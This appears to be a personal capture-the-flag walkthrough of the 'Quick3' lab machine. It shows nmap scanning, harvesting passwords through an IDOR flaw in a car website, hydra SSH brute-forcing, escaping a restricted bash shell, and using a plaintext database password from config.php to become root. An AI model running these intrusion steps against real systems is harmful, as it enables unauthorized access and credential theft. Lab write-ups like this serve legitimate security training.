@@ -1,1 +1,293 @@
+			ENUMERATION
+
+			
+---ifconfig---
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet6 fe80::a00:27ff:fef6:e3c3  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:f6:e3:c3  txqueuelen 1000  (Ethernet)
+        RX packets 17  bytes 5230 (5.1 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 51  bytes 5771 (5.6 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 24  bytes 1440 (1.4 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 24  bytes 1440 (1.4 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+
+---netdiscover---
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# netdiscover -i eth0 -r 10.0.2.0/24 -c 200                              
+
+ Currently scanning: 10.0.2.0/24   |   Screen View: Unique Hosts               
+                                                                               
+ 203 Captured ARP Req/Rep packets, from 7 hosts.   Total size: 12180           
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 10.0.2.1        52:54:00:12:35:00     29    1740  Unknown vendor              
+ 10.0.2.2        52:54:00:12:35:00     29    1740  Unknown vendor              
+ 10.0.2.3        08:00:27:be:c9:1d     29    1740  PCS Systemtechnik GmbH      
+ 10.0.2.24       08:00:27:78:54:01     29    1740  PCS Systemtechnik GmbH      
+ 10.0.2.24       08:00:27:28:12:35     29    1740  PCS Systemtechnik GmbH      
+ 10.0.2.25       08:00:27:78:54:01     29    1740  PCS Systemtechnik GmbH      
+ 10.0.2.25       08:00:27:28:12:35     29    1740  PCS Systemtechnik GmbH      
+
+zsh: suspended  netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+       
+
+
+---nmap on our target---
+
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.24 -sS -sC -sV -A -T4 -p-  
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-03 13:39 +03
+Nmap scan report for 10.0.2.24
+Host is up (0.00091s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 2e:7a:1f:17:57:44:6f:7f:f9:ce:ab:a1:4f:cd:c7:19 (ECDSA)
+|_  256 93:7e:d6:c9:03:5b:a1:ee:1d:54:d0:f0:27:0f:13:eb (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Quick Automative - Home
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+MAC Address: 08:00:27:28:12:35 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.91 ms 10.0.2.24
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 33.07 seconds
+   
+
+---we have open ssh and http ports, lets try to find some credentials from http and then try ssh---
+
+---I ran dirb, gobuster and ctfenum scans on the website, not much has showed up, let's dig into the website---
+
+
+---I went to the website and checked around, created an account to get in the system to look around---
+
+name = Ese
+gmail = ese@gmail.com
+password = ese123
+
+
+---now here we see that the user can add a car, look at other users details and from the my profile page can change his/her password---
+
+---In the profile page we notice that when we switch pages, the id value in url also changes, for example the user I created has id=29---
+
+---When I change the id value we straight up jump to that users page, and after that we can go to my profile page, using inspect elements on the page and see the user's encrypted password---
+
+---I take notes of all the usernames and matching passwords in QUICK3 folder, I dont change their passwords so its the old password credential that I use---
+
+
+Note: We take the username and passwords of the employees, not customers. Because we want to gain access to the server
+
+
+---now lets use hydra to try to get in the system---
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/QUICK3 LINUX CTF]
+└─# hydra -L users.txt -P passwd.txt ssh://10.0.2.24
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-03 15:53:07
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 120 login tries (l:12/p:10), ~8 tries per task
+[DATA] attacking ssh://10.0.2.24:22/
+[22][ssh] host: 10.0.2.24   login: mike   password: 6G3UCx6aH6UYvJ6m
+
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-04-03 15:53:37
+                                                            
+
+
+				
+					GAINING FOOTHOLD
+
+
+---looks like we got one valid password, lets use ssh now---
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/QUICK3 LINUX CTF]
+└─# ssh mike@10.0.2.24      
+mike@10.0.2.24's password: 
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)
+
+Last login: Wed Jan 24 12:56:53 2024 from 10.0.2.15
+mike@quick3:~$ ls
+user.txt
+mike@quick3:~$ cat user.txt
+  
+                                     _...----""""""""""""----..._
+                                   .'       ______________       `-.
+                                  :_..--"""" ___......___ """""----..
+                                .' _.---"""""   (______) `"""""----. `.
+                               / .'   .----.               .-----.  \  \
+                              / /    /      \             /       \  \  \
+                      .---.  / /    :        :           :,-"""""-.:  \  \  .---.
+                     :    `\: :   __:____....J.---------.:...______:   :  :'     :
+                      `"""-._ `"""_______......---------......______`""' _'.-"""'
+                          / \"""""                                  """""/`.
+                         / `.`.                                        .' ' `.
+                        /    \ `.                                    .' .'    \
+                       /      `. `-._                            _.-' .'      _:
+                     :|`""----.._    `"""--------------------"""'     _..---"" |:
+                     ::   /""\  _`.    _____..............______    .'_ /""\   ::
+                     | `._\__/ `" `.  : 888888888P"":'.d888888P '  : '" \__/_.' |
+                     |`-._  `""----'  : T888888P'|__|88888888P  :  `----"""'  _.|
+                     :    `"-._     :  `.`T8P" .d88888888888P'.'  '     __.-""  |
+                     :`.        `""` '   ``"""""""""""""""""     .'"""""       ,:
+                     |: `-,_          \                         :       __...-':|
+                     |:   '88P`Tp.    `d88888888888888888888888P    .dP`T88P   :|
+                     :8p.  `8b_d88b    888888888888888888888888'   d88b_dP'   d8:
+                     '8888b..___`""     `"""""""""""""""""""""'    `""___..gd888'
+                      88888888  ``"""""----------------------""""'""""  88888888
+                      '888888P                                    fsc   T888888P
+                       `"""""
+                
+                		---First User Flag---
+
+
+
+
+
+					PRIVILEGE ESCALATION
+
+
+---now let's look around---
+
+---I try cat /etc/crontab and sudo -l, user mike can't run any sudo commands and crontabs doesn't show anything---
+
+
+mike@quick3:~$ pwd
+/home/mike
+mike@quick3:~$ cd ..
+-rbash: cd: restricted
+mike@quick3:~$ cd /var/www/html
+-rbash: cd: restricted
+
+
+---here I kept seeing -rbash so I googled it---
+
+
+---I saw in a guide a way to overcome this, first we exit our shell and re-enter with these parameters---
+
+
+                                                                                                              
+┌──(root㉿kali)-[/opt/PEASS-ng/linPEAS]
+└─# ssh mike@10.0.2.24 -t "bash --noprofile -i"
+mike@10.0.2.24's password: 
+mike@quick3:~$ ls
+user.txt
+mike@quick3:~$ cd ..
+mike@quick3:/home$ ls
+andrew  coos  jeff  john  juan  lara  lee  mike  nick
+mike@quick3:/home$ cd /root
+bash: cd: /root: Permission denied
+mike@quick3:/home$ cd andrew/
+bash: cd: andrew/: Permission denied
+
+
+---now we are rid of -rbash but we still have restrictions, I do some manuel enumeration---
+
+---lets check the contents of the web server, maybe we can find something like a config file with user credentials---
+
+
+mike@quick3:/home$ cd /var/www/html
+mike@quick3:/var/www/html$ ls
+404.css  404.html  css  customer  fonts  images  img  index.html  js  lib  modules  scss  styles.css
+mike@quick3:/var/www/html$ cd customer
+mike@quick3:/var/www/html/customer$ ll
+total 232
+drwxr-xr-x  7 www-data www-data  4096 Jan 24 12:48 ./
+drwxr-xr-x 11 www-data www-data  4096 Jan 30 21:29 ../
+-rw-r--r--  1 www-data www-data 19730 Jan 23 20:58 cars.php
+-rw-r--r--  1 www-data www-data   202 Jan 21 15:28 config.php
+-rw-r--r--  1 www-data www-data 35755 Jan 23 16:15 contact.php
+drwxr-xr-x  2 www-data www-data  4096 Jan 22 19:38 css/
+-rw-r--r--  1 www-data www-data  9834 Jan 23 16:16 dashboard.php
+drwxr-xr-x  2 www-data www-data  4096 Jan 22 19:38 fonts/
+drwxr-xr-x  5 www-data www-data  4096 Jan 22 19:38 images/
+-rw-r--r--  1 www-data www-data  3171 Jan 22 19:34 index.php
+drwxr-xr-x  2 www-data www-data  4096 Jan 22 19:38 js/
+-rw-r--r--  1 www-data www-data  4118 Jan 24 12:43 login.css
+-rw-r--r--  1 www-data www-data   805 Jan 21 15:37 login.php
+-rw-r--r--  1 www-data www-data   184 Jan 21 15:41 logout.php
+drwxr-xr-x  2 www-data www-data 20480 Jan 22 19:38 modules/
+-rw-r--r--  1 www-data www-data   451 Jan 23 21:24 remove.php
+-rw-r--r--  1 www-data www-data   372 Jan 24 12:30 script.js
+-rw-r--r--  1 www-data www-data 57002 Jan 24 12:48 style.css
+-rw-r--r--  1 www-data www-data  1121 Jan 23 21:19 submitcar.php
+-rw-r--r--  1 www-data www-data  1104 Jan 24 09:10 updatepassword.php
+-rw-r--r--  1 www-data www-data  1213 Jan 24 08:06 updateuser.php
+-rw-r--r--  1 www-data www-data 19307 Jan 24 09:04 user.php
+
+
+---here I started to check the files and I saw the user credentials when I---
+
+mike@quick3:/var/www/html/customer$ cat config.php 
+<?php
+// config.php
+$conn = new mysqli('localhost', 'root', 'fastandquicktobefaster', 'quick');
+
+// Check connection
+if ($conn->connect_error) {
+	die("Connection failed: " . $conn->connect_error);
+}
+?>
+
+
+---lets login as root and get the flag---
+
+mike@quick3:/var/www/html/customer$ su root
+Password: 
+root@quick3:/var/www/html/customer# whoami
+root
+root@quick3:/var/www/html/customer# cd /root
+root@quick3:~# ls
+dash  root.txt  snap
+root@quick3:~# cat root.txt 
+               __---~~~~--__                      __--~~~~---__
+                          `\---~~~~~~~~\\                    //~~~~~~~~---/'
+                            \/~~~~~~~~~\||                  ||/~~~~~~~~~\/
+                                        `\\                //'
+                                          `\\            //'
+                                            ||          ||
+                                  ______--~~~~~~~~~~~~~~~~~~--______
+                             ___ // _-~                        ~-_ \\ ___
+                            `\__)\/~                              ~\/(__/'
+                             _--`-___                            ___-'--_
+                           /~     `\ ~~~~~~~~------------~~~~~~~~ /'     ~\
+                          /|        `\         ________         /'        |\
+                         | `\   ______`\_      \------/      _/'______   /' |
+                         |   `\_~-_____\ ~-________________-~ /_____-~_/'   |
+                         `.     ~-__________________________________-~     .'
+                          `.      [_______/------|~~|------\_______]      .'
+                           `\--___((____)(________\/________)(____))___--/'
+                            |>>>>>>||                            ||<<<<<<|
+                            `\<<<<</'                            `\>>>>>/'
+
+
+                        	---Root User Flag---
+
+
 
